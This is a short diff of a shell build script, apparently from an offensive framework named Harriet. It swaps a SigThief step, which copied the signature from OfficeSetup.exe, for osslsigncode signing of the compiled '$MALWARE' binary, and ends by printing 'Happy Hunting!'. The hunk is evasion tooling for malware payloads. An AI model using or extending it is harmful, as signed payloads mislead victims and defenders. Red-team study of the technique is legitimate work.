@@ -91,10 +91,32 @@ sleep 2
 echo -e ${yellow}"***Malware Compiled***"${clear}
 echo ""
 sleep 2
-echo -e ${yellow}"+++Adding Binary Signature+++"${clear}
-echo ""
-sleep 2
-python3 Harriet/Resources/SigThief/sigthief.py -i Harriet/Resources/OfficeSetup.exe -t $MALWARE -o signed.exe >/dev/null 2>&1
-mv signed.exe $MALWARE
+# Set static paths for certificate, private key, executable, and signed output
+CERTIFICATE_PATH="Harriet/Resources/certificate.pem"
+KEY_PATH="Harriet/Resources/private_key.pem"
+
+
+# Check if osslsigncode is installed
+if ! command -v osslsigncode &> /dev/null; then
+    echo "Error: osslsigncode is not installed. Please install it first."
+    exit 1
+fi
+
+# Check if the certificate and key files exist
+if [ ! -f "$CERTIFICATE_PATH" ] || [ ! -f "$KEY_PATH" ]; then
+    echo "Error: Certificate or private key file not found."
+    exit 1
+fi
+
+# Check if the executable file exists
+if [ ! -f "$MALWARE" ]; then
+    echo "Error: Executable file not found."
+    exit 1
+fi
+
+# Sign the executable using osslsigncode
+osslsigncode sign -certs "$CERTIFICATE_PATH" -key "$KEY_PATH" -in "$MALWARE" -out "signed$MALWARE" >/dev/null 2>&1
+
+mv signed$MALWARE $MALWARE
 echo -e ${yellow}"***Signature Added. Happy Hunting!**"${clear}
 echo ""
